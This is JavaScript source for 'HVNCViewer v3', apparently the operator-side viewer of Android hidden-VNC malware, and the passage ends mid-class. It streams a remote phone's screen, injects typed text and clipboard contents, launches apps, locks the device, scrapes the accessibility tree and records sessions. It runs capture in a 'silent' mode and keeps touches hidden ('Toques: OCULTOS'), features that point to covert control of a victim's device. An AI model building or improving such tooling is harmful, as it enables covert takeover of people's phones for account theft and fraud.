'use strict';
/**
 * HVNCViewer v3 — [K] upgrade
 *
 * Pipeline (unchanged — GPU decode, zero-copy):
 *   WS binary → parse 49B header → WorkerPool createImageBitmap()
 *   → pendingBitmap → rAF ctx.drawImage (desynchronized)
 *
 * v3 additions over v2:
 *   • WorkerPool — dual-worker round-robin decode, one decoding while other is idle
 *   • Stall auto-reconnect — 2s poll, re-subscribes if no frame in 6s
 *   • Canvas recording — VP8 WebM via MediaRecorder, download on stop
 *   • Pan when zoomed — Shift+drag or middle-mouse drag; 1:1 resets zoom+pan
 *   • Ripple animations — TAP=blue, LONG_PRESS=amber, canvas-native
 *   • DPI-aware canvas — scales by devicePixelRatio (capped 2×)
 *   • Fullscreen button — requestFullscreen on root div
 *   • Shortcut legend — ? key or ? button toggles overlay grid
 *   • Hold-scroll — continuous SWIPE on drag, 80ms throttle
 *   • Quick app launch — ⚡ Launch prompts package + sends OPEN_APP
 *   • Better HUD — dropped-frame count in red, dropped shown when >0
 *
 * v2 fixes preserved:
 *   [Bug 4] SWIPE threshold: 14 → 0.03 (normalized)
 *   [Bug 5] scroll delta: ±400px → ±0.25 normalized
 */

// ── WorkerPool ─────────────────────────────────────────────────────────────────
const _WORKER_SRC = `
self.onmessage = async ({ data: { seq, buf } }) => {
  try {
    const bmp = await createImageBitmap(
      new Blob([buf], { type: 'image/jpeg' }),
      { premultiplyAlpha: 'none', colorSpaceConversion: 'none' }
    );
    self.postMessage({ seq, bmp }, [bmp]);
  } catch {}
};
`;

class WorkerPool {
  constructor(size = 2) {
    const url = URL.createObjectURL(new Blob([_WORKER_SRC], { type: 'application/javascript' }));
    this._workers = Array.from({ length: size }, () => new Worker(url));
    this._rr      = 0;
    URL.revokeObjectURL(url);
  }
  set onmessage(fn) { this._workers.forEach(w => (w.onmessage = fn)); }
  postMessage(data, transfer) {
    this._workers[this._rr++ % this._workers.length].postMessage(data, transfer);
  }
  terminate() { this._workers.forEach(w => w.terminate()); }
}

// ── FPS sparkline ──────────────────────────────────────────────────────────────
class FpsSparkline {
  constructor(w = 80, h = 22, maxFps = 30) {
    this.w = w; this.h = h; this.maxFps = maxFps;
    this.history = new Array(w).fill(0);
    this._lat = -1;
  }
  push(fps) { this.history.shift(); this.history.push(Math.min(fps, this.maxFps)); }
  setLatency(ms) { this._lat = ms; }
  draw(ctx, x, y, dpr = 1, dropped = 0) {
    const { w, h, history, maxFps } = this;
    ctx.save();
    ctx.fillStyle = 'rgba(0,0,0,0.65)';
    ctx.fillRect(x, y, (w + 72) * dpr, (h + 10) * dpr);
    for (let i = 0; i < w; i++) {
      const v  = history[i];
      const bh = Math.round((v / maxFps) * h * dpr);
      ctx.fillStyle = `hsl(${120 * (v / maxFps)},80%,48%)`;
      ctx.fillRect(x + i * dpr, y + (h + 4) * dpr - bh, dpr, bh);
    }
    const cur = history[w - 1];
    const lat = this._lat;
    ctx.font      = `bold ${11 * dpr}px monospace`;
    ctx.fillStyle = cur >= 10 ? '#3dba7a' : cur >= 4 ? '#e0b84a' : '#e05c5c';
    ctx.fillText(`${cur.toFixed(1)} FPS`, x + (w + 3) * dpr, y + 12 * dpr);
    ctx.font      = `${9 * dpr}px monospace`;
    ctx.fillStyle = '#6666aa';
    ctx.fillText(lat >= 0 ? `${lat}ms` : '---', x + (w + 3) * dpr, y + 23 * dpr);
    if (dropped > 0) {
      ctx.fillStyle = '#e05c5c';
      ctx.fillText(`↓${dropped}`, x + (w + 3) * dpr, y + 34 * dpr);
    }
    ctx.restore();
  }
}

// ── HVNCViewer ─────────────────────────────────────────────────────────────────
class HVNCViewer {
  /**
   * @param {HTMLElement} container
   * @param {string}      deviceId
   * @param {Function}    sendFn   — sendJson(obj)
   * @param {{ frameW, frameH, screenW, screenH }} opts
   */
  constructor(container, deviceId, sendFn, opts = {}) {
    this.container = container;
    this.deviceId  = deviceId;
    this._send     = sendFn;

    this.frameW  = opts.frameW  ?? 360;
    this.frameH  = opts.frameH  ?? 780;
    this.screenW = opts.screenW ?? 1080;
    this.screenH = opts.screenH ?? 1920;

    this._zoom    = 1.0;
    this._panX    = 0;
    this._panY    = 0;
    this._panning = false;
    this._panOrigin    = null;
    this._panOriginPan = null;

    this._quality = 50;
    this._mode    = 'vnc';
    this._running = false;
    this._lyReader = null;

    this._buildUI();

    // Frame pipeline
    this._pending   = null;
    this._seq       = 0;
    this._latestSeq = -1;
    this._rafId     = null;

    // Metrics
    this._times       = [];
    this._latencies   = [];
    this._dropped     = 0;
    this._sparkline   = new FpsSparkline(80, 22, 30);
    this._sparkTimer  = setInterval(() => this._sparkline.push(this.fps), 1000);
    this._showOverlay = true;

    // Ripples
    this._ripples = [];

    // Stall detection
    this._lastFrameTime = 0;
    this._stallTimer    = null;

    // Recording
    this._recorder    = null;
    this._recChunks   = [];
    this._recActive   = false;

    // Quality adaptation
    this._stableLow  = 0;
    this._stableHigh = 0;
    this._qaTimer    = setInterval(() => this._adaptQuality(), 1000);

    // Worker pool
    this._pool = new WorkerPool(2);
    this._pool.onmessage = ({ data: { seq, bmp } }) => {
      if (seq < this._latestSeq) { bmp.close(); this._dropped++; return; }
      this._latestSeq = seq;
      if (this._pending) { this._pending.close(); this._dropped++; }
      this._pending = bmp;
    };

    // Input
    this._mouse = { down: false, origin: null, t: 0, holdScrollFired: false,
                    lastScrollPos: null, lastScrollTime: 0 };
    this._pinch = { dist: 0, active: false };
    this._bindInput();

    this._startRenderLoop();
    this._drawPlaceholder();
  }

  // ── UI build ───────────────────────────────────────────────────────────────
  _buildUI() {
    const dpr = Math.min(window.devicePixelRatio || 1, 2);
    this._dpr = dpr;

    this.container.innerHTML = `
    <div id="_hv_root" style="
      display:flex;flex-direction:column;width:100%;height:100%;
      background:#06060f;position:relative">

      <!-- SHORTCUT LEGEND OVERLAY -->
      <div id="_hv_shortcuts" style="
        display:none;position:absolute;inset:0;background:rgba(6,6,15,0.94);
        z-index:200;overflow-y:auto;padding:20px 24px;pointer-events:auto">
        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:16px">
          <span style="font-size:14px;font-weight:700;color:#7c6af7">Keyboard Shortcuts</span>
          <button id="_hv_scClose" style="
            background:none;border:1px solid #2a2a50;color:#555;
            border-radius:4px;padding:2px 10px;font-size:11px;cursor:pointer">✕ Close</button>
        </div>
        <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:6px;font-size:11px">
          ${[
            ['Ctrl+H',     'HOME'],
            ['Ctrl+B',     'BACK'],
            ['Ctrl+R',     'RECENTS'],
            ['Ctrl+V',     'Paste clipboard → TYPE'],
            ['Ctrl+C',     'Lock device'],
            ['Ctrl+S',     'Start stream'],
            ['Ctrl+Q',     'Stop stream'],
            ['Escape',     'BACK'],
            ['F1',         'HOME'],
            ['F2',         'RECENTS'],
            ['F3',         'Quick Settings'],
            ['F5',         'Restart VNC capture'],
            ['Arrow keys', 'Scroll / swipe'],
            ['Backspace',  'Delete char (TYPE \\b)'],
            ['Enter',      'Newline (TYPE \\n)'],
            ['Tab',        'Tab char'],
            ['Delete',     'DEL char'],
            ['Printable',  'TYPE character'],
            ['?',          'Toggle this legend'],
            ['Shift+drag', 'Pan canvas when zoomed'],
            ['Middle-drag','Pan canvas when zoomed'],
            ['Ctrl+scroll','Zoom in / out'],
          ].map(([k, v]) => `
            <div style="display:flex;gap:8px;align-items:center;
              background:#0e0e1c;border:1px solid #1a1a2e;
              border-radius:4px;padding:5px 8px">
              <span style="font-family:monospace;color:#7c6af7;
                min-width:90px;font-size:10px;flex-shrink:0">${k}</span>
              <span style="color:#888">${v}</span>
            </div>`).join('')}
        </div>
      </div>

      <!-- TOP BAR -->
      <div id="_hv_topbar" style="
        display:flex;align-items:center;gap:8px;padding:6px 10px;
        background:#0e0e1c;border-bottom:1px solid #1a1a2e;flex-shrink:0;flex-wrap:wrap">

        <!-- Mode selector -->
        <div style="display:flex;border:1px solid #1e1e32;border-radius:6px;overflow:hidden">
          <button id="_hv_m_vnc"  class="_hvmode active" data-mode="vnc">VNC</button>
          <button id="_hv_m_v2"   class="_hvmode"        data-mode="v2">V2</button>
          <button id="_hv_m_dpl"  class="_hvmode"        data-mode="duplo">DUPLO</button>
          <button id="_hv_m_rdr"  class="_hvmode"        data-mode="radar"
            style="border-left:1px solid #1e1e32;color:#3dba7a"
            title="Ly Screen Reader — accessibility tree">Ly</button>
        </div>

        <!-- Start / Stop -->
        <button id="_hv_start" style="
          background:#1e5c2a;border:1px solid #3dba7a;color:#3dba7a;
          border-radius:5px;padding:4px 14px;font-size:12px;font-weight:700;cursor:pointer">
          ▶ START
        </button>
        <button id="_hv_stop" style="
          background:#3d0a0a;border:1px solid #e05c5c;color:#e05c5c;
          border-radius:5px;padding:4px 14px;font-size:12px;font-weight:700;cursor:pointer">
          ⏹ STOP
        </button>

        <div style="width:1px;height:22px;background:#1e1e32;margin:0 2px"></div>

        <!-- Quality -->
        <span style="font-size:10px;color:#555">Q</span>
        <input type="range" id="_hv_q" min="10" max="85" value="50" step="5"
          style="width:80px;accent-color:#7c6af7">
        <span id="_hv_ql" style="font-size:10px;color:#7c6af7;width:26px">50%</span>

        <!-- Zoom -->
        <span style="font-size:10px;color:#555">Z</span>
        <input type="range" id="_hv_zoom" min="50" max="400" value="100" step="10"
          style="width:70px;accent-color:#3dba7a">
        <span id="_hv_zl" style="font-size:10px;color:#3dba7a;width:34px">100%</span>
        <button id="_hv_zreset" style="
          background:none;border:1px solid #222244;color:#555;
          border-radius:4px;padding:2px 6px;font-size:10px;cursor:pointer"
          title="Reset zoom and pan">1:1</button>

        <span style="flex:1"></span>

        <!-- Recording -->
        <button id="_hv_recbtn" style="
          background:#1a1a2e;border:1px solid #2a2a50;color:#888;
          border-radius:4px;padding:2px 8px;font-size:10px;cursor:pointer;font-weight:600"
          title="Record canvas as WebM">⏺ REC</button>

        <!-- Fullscreen -->
        <button id="_hv_fullscreen" style="
          background:none;border:1px solid #222244;color:#444;
          border-radius:4px;padding:2px 7px;font-size:12px;cursor:pointer"
          title="Fullscreen">⛶</button>

        <!-- Shortcut help -->
        <button id="_hv_helpbtn" style="
          background:none;border:1px solid #222244;color:#444;
          border-radius:4px;padding:2px 7px;font-size:11px;cursor:pointer"
          title="Keyboard shortcuts">?</button>

        <!-- Status chip -->
        <div id="_hv_status" style="
          font-size:10px;color:#333356;background:#0e0e1c;
          border:1px solid #1a1a2e;border-radius:4px;padding:2px 8px">
          IDLE
        </div>
        <span id="_hv_dim" style="font-size:9px;color:#222240">${this.frameW}×${this.frameH}</span>
      </div>

      <!-- GESTURE TOOLBAR -->
      <div id="_hv_gestures" style="
        display:flex;align-items:center;gap:4px;padding:4px 10px;
        background:#090915;border-bottom:1px solid #14142a;flex-shrink:0;flex-wrap:wrap">

        <!-- Navigation -->
        <button class="_hvbtn" data-cmd="BACK"          title="Back">← Back</button>
        <button class="_hvbtn" data-cmd="HOME"          title="Home">⌂ Home</button>
        <button class="_hvbtn" data-cmd="RECENTS"       title="Recents">⧉ Recents</button>
        <button class="_hvbtn" data-cmd="NOTIFICATIONS" title="Notifications">🔔 Notifs</button>
        <button class="_hvbtn" data-cmd="QUICK_SETTINGS" title="Quick Settings">⚙ QS</button>

        <div style="width:1px;height:18px;background:#1a1a2e;margin:0 2px"></div>

        <!-- System -->
        <button class="_hvbtn" data-cmd="WAKEUP"      title="Wake Screen">☀ Wake</button>
        <button class="_hvbtn" data-cmd="LOCK_DEVICE" title="Lock Screen">🔒 Lock</button>
        <button class="_hvbtn" data-cmd="POWER_MENU"  title="Power Menu">⏻ Power</button>
        <button class="_hvbtn" data-cmd="VOLUME_UP"   title="Volume Up">🔊+</button>
        <button class="_hvbtn" data-cmd="VOLUME_DOWN" title="Volume Down">🔉−</button>

        <div style="width:1px;height:18px;background:#1a1a2e;margin:0 2px"></div>

        <!-- Input -->
        <button class="_hvbtn" data-cmd="SNAP_SCREEN" title="Screenshot">📷 Snap</button>
        <button id="_hv_typebtn" style="
          background:#1a1a2e;border:1px solid #2a2a50;color:#888;
          border-radius:4px;padding:2px 8px;font-size:10px;cursor:pointer" title="Type text">⌨ Type</button>
        <button id="_hv_pastebtn" style="
          background:#1a1a2e;border:1px solid #2a2a50;color:#888;
          border-radius:4px;padding:2px 8px;font-size:10px;cursor:pointer" title="Paste clipboard">📋 Paste</button>
        <button id="_hv_hierarchybtn" style="
          background:#1a1a2e;border:1px solid #2a2a50;color:#888;
          border-radius:4px;padding:2px 8px;font-size:10px;cursor:pointer" title="Request hierarchy">🌳 Hier</button>

        <!-- Quick App Launch -->
        <button id="_hv_launchbtn" style="
          background:#1a1a2e;border:1px solid #e0a84a;color:#e0a84a;
          border-radius:4px;padding:2px 8px;font-size:10px;cursor:pointer;font-weight:600"
          title="Open app by package name">⚡ Launch</button>

        <div style="width:1px;height:18px;background:#1a1a2e;margin:0 2px"></div>

        <!-- Stream controls -->
        <button id="_hv_restartbtn" style="
          background:#1a1a2e;border:1px solid #7c4af7;color:#7c4af7;
          border-radius:4px;padding:2px 8px;font-size:10px;cursor:pointer;font-weight:600"
          title="Restart VNC capture on device + re-subscribe stream">↺ VNC Restart</button>

        <button id="_hv_refreshbtn" style="
          background:#1a1a2e;border:1px solid #3dba7a;color:#3dba7a;
          border-radius:4px;padding:2px 8px;font-size:10px;cursor:pointer"
          title="Soft refresh: stop + re-subscribe stream">🔄 Refresh</button>

        <div style="width:1px;height:18px;background:#1a1a2e;margin:0 2px"></div>

        <!-- Touch visibility toggle -->
        <button id="_hv_touchtoggle" style="
          background:#1a1a2e;border:1px solid #2a2a50;color:#888;
          border-radius:4px;padding:2px 8px;font-size:10px;cursor:pointer">👁 Toques: OCULTOS</button>

        <span style="flex:1"></span>
        <button id="_hv_overlayToggle" style="
          background:none;border:none;color:#333;font-size:10px;cursor:pointer">Overlay</button>
      </div>

      <!-- CANVAS AREA -->
      <div id="_hv_canvasrow" style="
        flex:1;overflow:hidden;display:flex;align-items:stretch;
        justify-content:center;background:#06060f">
        <div id="_hv_mainwrap" style="
          flex:1;display:flex;align-items:center;justify-content:center;overflow:hidden">
          <canvas id="_hv_cv" tabindex="0" style="
            max-width:100%;max-height:100%;object-fit:contain;
            cursor:crosshair;outline:none;user-select:none;touch-action:none;
            transform-origin:center center"></canvas>
        </div>
        <div id="_hv_v2panel" style="
          flex:1;display:none;align-items:center;justify-content:center;
          overflow:hidden;border-left:1px solid #1a1a2e">
          <canvas id="_hv_cv2" tabindex="0" style="
            max-width:100%;max-height:100%;object-fit:contain;
            cursor:crosshair;outline:none;user-select:none;touch-action:none"></canvas>
        </div>
        <div id="_hv_radarpanel" style="
          flex:1;display:none;position:relative;overflow:hidden;
          border-left:1px solid #1a1a2e"></div>
      </div>
    </div>

    <style>
      ._hvmode {
        background:none;border:none;color:#444;padding:3px 10px;
        font-size:11px;font-weight:700;cursor:pointer;transition:background .15s;
      }
      ._hvmode.active { background:#1e1e38;color:#7c6af7; }
      ._hvmode:hover:not(.active) { background:#12121f;color:#666; }
      ._hvbtn {
        background:#0e0e1e;border:1px solid #1e1e32;color:#777;
        border-radius:4px;padding:2px 8px;font-size:10px;cursor:pointer;
        transition:background .12s,color .12s,border-color .12s;
      }
      ._hvbtn:hover { background:#1a1a2e;color:#aaa;border-color:#2a2a50; }
      ._hvbtn:active { background:#252540; }
    </style>`;

    this.canvas  = this.container.querySelector('#_hv_cv');
    this.canvas2 = this.container.querySelector('#_hv_cv2');

    // DPI-aware canvas sizing
    this.canvas.width   = this.frameW * dpr;
    this.canvas.height  = this.frameH * dpr;
    this.canvas.style.width  = this.frameW + 'px';
    this.canvas.style.height = this.frameH + 'px';

    this.canvas2.width  = this.frameW * dpr;
    this.canvas2.height = this.frameH * dpr;
    this.canvas2.style.width  = this.frameW + 'px';
    this.canvas2.style.height = this.frameH + 'px';

    this.ctx  = this.canvas.getContext('2d',  { alpha: false, desynchronized: true });
    this.ctx2 = this.canvas2.getContext('2d', { alpha: false, desynchronized: true });
    this.canvas.focus();

    this._bindToolbar();
  }

  // ── Toolbar ────────────────────────────────────────────────────────────────
  _bindToolbar() {
    const c = this.container;

    // Mode selector
    c.querySelectorAll('._hvmode').forEach(btn => {
      btn.addEventListener('click', () => {
        c.querySelectorAll('._hvmode').forEach(b => b.classList.remove('active'));
        btn.classList.add('active');
        const wasRunning = this._running;
        if (wasRunning) this.stop();
        this._mode = btn.dataset.mode;

        const v2panel    = c.querySelector('#_hv_v2panel');
        const radarPanel = c.querySelector('#_hv_radarpanel');
        const mainWrap   = c.querySelector('#_hv_mainwrap');

        v2panel.style.display    = 'none';
        radarPanel.style.display = 'none';
        mainWrap.style.display   = 'flex';

        if (this._mode === 'duplo') {
          v2panel.style.display = 'flex';
        } else if (this._mode === 'radar') {
          mainWrap.style.display   = 'none';
          radarPanel.style.display = 'block';
          if (!this._lyReader && typeof LyReader !== 'undefined') {
            this._lyReader = new LyReader(
              radarPanel, this.deviceId,
              obj => this._send(obj),
              this.screenW, this.screenH
            );
          }
        }

        if (wasRunning) setTimeout(() => this.start(), 200);
      });
    });

    // Start / Stop
    c.querySelector('#_hv_start').addEventListener('click', () => this.start());
    c.querySelector('#_hv_stop' ).addEventListener('click', () => this.stop());

    // Quality
    const qSl = c.querySelector('#_hv_q');
    const qLb = c.querySelector('#_hv_ql');
    qSl.addEventListener('input', () => {
      this._quality = parseInt(qSl.value);
      qLb.textContent = this._quality + '%';
      if (this._running) this._cmd('SET_SILENT_VNC_QUALITY', { quality: this._quality });
    });

    // Zoom slider
    const zSl = c.querySelector('#_hv_zoom');
    const zLb = c.querySelector('#_hv_zl');
    zSl.addEventListener('input', () => {
      this._zoom = parseInt(zSl.value) / 100;
      zLb.textContent = zSl.value + '%';
      this._applyZoom();
    });

    // 1:1 — reset zoom AND pan
    c.querySelector('#_hv_zreset').addEventListener('click', () => {
      this._zoom = 1;
      this._panX = 0;
      this._panY = 0;
      if (zSl) zSl.value = 100;
      if (zLb) zLb.textContent = '100%';
      this._applyZoom();
    });

    // Gesture buttons
    c.querySelectorAll('._hvbtn').forEach(btn => {
      btn.addEventListener('click', () => this._cmd(btn.dataset.cmd, {}));
    });

    // Type
    c.querySelector('#_hv_typebtn').addEventListener('click', () => {
      const text = prompt('Type text to inject:');
      if (text !== null && text.length > 0) this._cmd('TYPE', { text });
    });

    // Paste
    c.querySelector('#_hv_pastebtn').addEventListener('click', () => {
      navigator.clipboard.readText().then(text => {
        if (text) {
          this._cmd('SET_CLIPBOARD', { text });
          setTimeout(() => this._cmd('TYPE', { text }), 100);
        }
      }).catch(() => {
        const text = prompt('Paste text (clipboard denied):');
        if (text) {
          this._cmd('SET_CLIPBOARD', { text });
          setTimeout(() => this._cmd('TYPE', { text }), 100);
        }
      });
    });

    // Hierarchy
    c.querySelector('#_hv_hierarchybtn').addEventListener('click', () => {
      this._cmd('REQUEST_HIERARCHY', {});
    });

    // Quick app launch
    c.querySelector('#_hv_launchbtn').addEventListener('click', () => {
      const pkg = prompt('Package name (e.g. com.android.chrome):');
      if (pkg && pkg.trim()) this._cmd('OPEN_APP', { package: pkg.trim() });
    });

    // VNC Restart
    c.querySelector('#_hv_restartbtn').addEventListener('click', () => {
      this._cmd('FORCE_RESTART_VNC', {});
      const wasRunning = this._running;
      if (wasRunning) this.stop();
      setTimeout(() => { if (wasRunning) this.start(); }, 600);
    });

    // Soft Refresh
    c.querySelector('#_hv_refreshbtn').addEventListener('click', () => {
      if (this._running) {
        this.stop();
        setTimeout(() => this.start(), 300);
      } else {
        this.start();
      }
    });

    // Touch visibility
    let touchVisible = false;
    const touchBtn = c.querySelector('#_hv_touchtoggle');
    touchBtn.addEventListener('click', () => {
      touchVisible = !touchVisible;
      touchBtn.textContent = `👁 Toques: ${touchVisible ? 'VISÍVEIS' : 'OCULTOS'}`;
      touchBtn.style.color = touchVisible ? '#3dba7a' : '#888';
      touchBtn.style.borderColor = touchVisible ? '#3dba7a' : '#2a2a50';
      this._cmd('TOGGLE_TOUCH_VISIBILITY', { visible: touchVisible });
    });

    // Overlay toggle
    c.querySelector('#_hv_overlayToggle').addEventListener('click', () => this.toggleOverlay());

    // Recording
    const recBtn = c.querySelector('#_hv_recbtn');
    recBtn.addEventListener('click', () => this._toggleRecording(recBtn));

    // Fullscreen
    c.querySelector('#_hv_fullscreen').addEventListener('click', () => {
      const root = c.querySelector('#_hv_root');
      if (root.requestFullscreen)       root.requestFullscreen();
      else if (root.webkitRequestFullscreen) root.webkitRequestFullscreen();
    });

    // Shortcut legend
    const helpBtn = c.querySelector('#_hv_helpbtn');
    helpBtn.addEventListener('click', () => this._toggleShortcuts());
    c.querySelector('#_hv_scClose').addEventListener('click', () => this._toggleShortcuts(false));
  }

  // ── Recording ──────────────────────────────────────────────────────────────
  _toggleRecording(btn) {
    if (this._recActive) {
      if (this._recorder) this._recorder.stop();
      return;
    }

    const mimeType = MediaRecorder.isTypeSupported('video/webm;codecs=vp8')
      ? 'video/webm;codecs=vp8' : 'video/webm';

    let stream;
    try {
      stream = this.canvas.captureStream(20);
    } catch {
      alert('captureStream not supported in this browser.');
      return;
    }

    this._recChunks = [];
    this._recorder  = new MediaRecorder(stream, { mimeType });

    this._recorder.ondataavailable = e => {
      if (e.data && e.data.size > 0) this._recChunks.push(e.data);
    };

    this._recorder.onstop = () => {
      const blob = new Blob(this._recChunks, { type: mimeType });
      const a    = document.createElement('a');
      a.href     = URL.createObjectURL(blob);
      a.download = `hvnc_${this.deviceId.slice(0, 8)}_${Date.now()}.webm`;
      a.click();
      URL.revokeObjectURL(a.href);
      this._recActive = false;
      this._recorder  = null;
      btn.textContent = '⏺ REC';
      btn.style.color = '#888';
      btn.style.borderColor = '#2a2a50';
    };

    this._recorder.start(500); // 500ms timeslice
    this._recActive = true;
    btn.textContent = '⏹ STOP REC';
    btn.style.color = '#e05c5c';
    btn.style.borderColor = '#e05c5c';
  }

  // ── Shortcut legend ────────────────────────────────────────────────────────
  _toggleShortcuts(force) {
    const el = this.container.querySelector('#_hv_shortcuts');
    if (!el) return;
    const show = force !== undefined ? force : el.style.display === 'none';
    el.style.display = show ? 'block' : 'none';
  }

  // ── Zoom + Pan transform ───────────────────────────────────────────────────
  _applyZoom() {
    this.canvas.style.transform =
      `translate(${this._panX}px, ${this._panY}px) scale(${this._zoom})`;
  }

  // ── Start/Stop ─────────────────────────────────────────────────────────────
  start() {
    if (this._running) return;
    this._running = true;
    this._lastFrameTime = Date.now();
    this._setStatus('LIVE', '#3dba7a');
    this._startStallMonitor();

    switch (this._mode) {
      case 'vnc':
        this._sendOp({ type: 'vnc_subscribe',    devId: this.deviceId, quality: this._quality });
        break;
      case 'v2':
        this._sendOp({ type: 'vnc_v2_subscribe', devId: this.deviceId, quality: this._quality });
        break;
      case 'duplo':
        this._sendOp({ type: 'vnc_subscribe',    devId: this.deviceId, quality: this._quality });
        this._sendOp({ type: 'vnc_v2_subscribe', devId: this.deviceId, quality: this._quality });
        break;
      case 'radar':
        if (this._lyReader) {
          this._lyReader.startPolling(700);
        } else if (typeof LyReader !== 'undefined') {
          const radarPanel = this.container.querySelector('#_hv_radarpanel');
          if (radarPanel) {
            this._lyReader = new LyReader(
              radarPanel, this.deviceId,
              obj => this._send(obj),
              this.screenW, this.screenH
            );
            this._lyReader.startPolling(700);
          }
        } else {
          this._send({ type: 'cmd', target: this.deviceId, cmd: 'REQUEST_HIERARCHY', args: {} });
        }
        break;
    }
  }

  stop() {
    if (!this._running) return;
    this._running = false;
    this._stopStallMonitor();
    this._setStatus('IDLE', '#333356');

    switch (this._mode) {
      case 'vnc':
        this._sendOp({ type: 'vnc_unsubscribe',    devId: this.deviceId }); break;
      case 'v2':
        this._sendOp({ type: 'vnc_v2_unsubscribe', devId: this.deviceId }); break;
      case 'duplo':
        this._sendOp({ type: 'vnc_unsubscribe',    devId: this.deviceId });
        this._sendOp({ type: 'vnc_v2_unsubscribe', devId: this.deviceId });
        break;
      case 'radar':
        if (this._lyReader) this._lyReader.stopPolling(); break;
    }

    this._drawPlaceholder();
  }

  // ── Stall monitor ──────────────────────────────────────────────────────────
  _startStallMonitor() {
    this._stopStallMonitor();
    this._stallTimer = setInterval(() => {
      if (!this._running) return;
      if (Date.now() - this._lastFrameTime > 6000) {
        this._setStatus('STALL→RECONNECT', '#e0a84a');
        this.stop();
        setTimeout(() => { if (!this._running) this.start(); }, 350);
      }
    }, 2000);
  }

  _stopStallMonitor() {
    if (this._stallTimer) { clearInterval(this._stallTimer); this._stallTimer = null; }
  }

  _setStatus(label, color) {
    const el = this.container.querySelector('#_hv_status');
    if (el) { el.textContent = label; el.style.color = color; el.style.borderColor = color + '55'; }
  }

  // ── Receive frame ──────────────────────────────────────────────────────────
  onFrame(jpegBuf, serverTs, isV2 = false) {
    this._lastFrameTime = Date.now();
    const seq = ++this._seq;
    const now = performance.now();

    this._times.push(now);
    if (this._times.length > 60) this._times.shift();

    if (serverTs > 0) {
      const lat = Date.now() - serverTs;
      if (lat >= 0 && lat < 8000) {
        this._latencies.push(lat);
        if (this._latencies.length > 30) this._latencies.shift();
        this._sparkline.setLatency(Math.round(
          this._latencies.reduce((a, b) => a + b, 0) / this._latencies.length
        ));
      }
    }

    if (isV2 && (this._mode === 'duplo' || this._mode === 'v2')) {
      createImageBitmap(
        new Blob([jpegBuf], { type: 'image/jpeg' }),
        { premultiplyAlpha: 'none', colorSpaceConversion: 'none' }
      ).then(bmp => {
        this.ctx2.drawImage(bmp, 0, 0, this.canvas2.width, this.canvas2.height);
        bmp.close();
      }).catch(() => {});
      return;
    }

    // Zero-copy transfer to pool
    this._pool.postMessage({ seq, buf: jpegBuf }, [jpegBuf]);
  }

  // ── Metrics ───────────────────────────────────────────────────────────────
  get fps() {
    const t = this._times;
    if (t.length < 2) return 0;
    const span = t[t.length - 1] - t[0];
    return span > 0 ? (t.length - 1) / (span / 1000) : 0;
  }

  toggleOverlay() { this._showOverlay = !this._showOverlay; }

  // ── Render loop ────────────────────────────────────────────────────────────
  _startRenderLoop() {
    const tick = () => {
      this._rafId = requestAnimationFrame(tick);
      if (this._pending) {
        this.ctx.drawImage(this._pending, 0, 0, this.canvas.width, this.canvas.height);
        this._pending.close();
        this._pending = null;
      }
      if (this._showOverlay) this._drawOverlay();
      this._drawRipples();
    };
    this._rafId = requestAnimationFrame(tick);
  }

  _drawOverlay() {
    const dpr = this._dpr;
    this._sparkline.draw(this.ctx, 4 * dpr, 4 * dpr, dpr, this._dropped);
    if (this._cursor) this._drawCursor();
  }

  // ── Ripple animations ──────────────────────────────────────────────────────
  _spawnRipple(nx, ny, type) {
    this._ripples.push({
      x:    nx * this.canvas.width,
      y:    ny * this.canvas.height,
      t:    performance.now(),
      type,
    });
  }

  _drawRipples() {
    if (!this._ripples.length) return;
    const now      = performance.now();
    const DURATION = 450;
    const dpr      = this._dpr;
    this._ripples  = this._ripples.filter(r => now - r.t < DURATION);

    for (const r of this._ripples) {
      const p      = (now - r.t) / DURATION;
      const radius = p * 44 * dpr;
      const alpha  = (1 - p) * 0.75;
      this.ctx.save();
      this.ctx.beginPath();
      this.ctx.arc(r.x, r.y, radius, 0, Math.PI * 2);
      this.ctx.strokeStyle = r.type === 'long'
        ? `rgba(224,168,74,${alpha})`
        : `rgba(74,168,255,${alpha})`;
      this.ctx.lineWidth = 2.5 * dpr;
      this.ctx.stroke();
      // inner ring
      this.ctx.beginPath();
      this.ctx.arc(r.x, r.y, radius * 0.4, 0, Math.PI * 2);
      this.ctx.strokeStyle = r.type === 'long'
        ? `rgba(224,168,74,${alpha * 0.5})`
        : `rgba(74,168,255,${alpha * 0.5})`;
      this.ctx.lineWidth = dpr;
      this.ctx.stroke();
      this.ctx.restore();
    }
  }

  _drawCursor() {
    const { x, y } = this._cursor;
    const dpr = this._dpr;
    const cx  = x * this.canvas.width;
    const cy  = y * this.canvas.height;
    const c   = this.ctx;
    c.save();
    c.strokeStyle = 'rgba(255,60,60,0.85)';
    c.lineWidth   = 1.5 * dpr;
    c.beginPath();
    c.moveTo(cx - 11 * dpr, cy); c.lineTo(cx - 4 * dpr, cy);
    c.moveTo(cx + 4 * dpr,  cy); c.lineTo(cx + 11 * dpr, cy);
    c.moveTo(cx, cy - 11 * dpr); c.lineTo(cx, cy - 4 * dpr);
    c.moveTo(cx, cy + 4 * dpr);  c.lineTo(cx, cy + 11 * dpr);
    c.stroke();
    c.beginPath();
    c.arc(cx, cy, 3 * dpr, 0, Math.PI * 2);
    c.strokeStyle = 'rgba(255,100,100,0.7)';
    c.lineWidth   = dpr;
    c.stroke();
    if (this._mouse.down) {
      c.beginPath();
      c.arc(cx, cy, 10 * dpr, 0, Math.PI * 2);
      c.strokeStyle = 'rgba(255,80,80,0.5)';
      c.lineWidth   = 1.5 * dpr;
      c.stroke();
    }
    c.restore();
  }

  _drawPlaceholder() {
    const c = this.ctx;
    const w = this.canvas.width;
    const h = this.canvas.height;
    const d = this._dpr;
    c.fillStyle = '#06060f';
    c.fillRect(0, 0, w, h);
    c.strokeStyle = '#1e1e38';
    c.lineWidth   = 1.5 * d;
    c.beginPath();
    if (c.roundRect) {
      c.roundRect(w / 2 - 80 * d, h / 2 - 140 * d, 160 * d, 280 * d, 14 * d);
    } else {
      c.rect(w / 2 - 80 * d, h / 2 - 140 * d, 160 * d, 280 * d);
    }
    c.stroke();
    c.fillStyle = '#2a2a4a';
    c.font      = `bold ${12 * d}px monospace`;
    c.textAlign = 'center';
    c.fillText('Press ▶ START', w / 2, h / 2 + 10 * d);
    c.font      = `${10 * d}px monospace`;
    c.fillStyle = '#1e1e32';
    c.fillText(`Mode: ${this._mode.toUpperCase()}`, w / 2, h / 2 + 28 * d);
    c.textAlign = 'left';
  }

